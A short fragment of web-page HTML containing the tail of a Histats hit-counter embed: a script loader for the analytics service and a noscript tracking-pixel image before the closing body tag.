_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4203309&101" alt="web page hit counter" border="0"></a></noscript>
</body>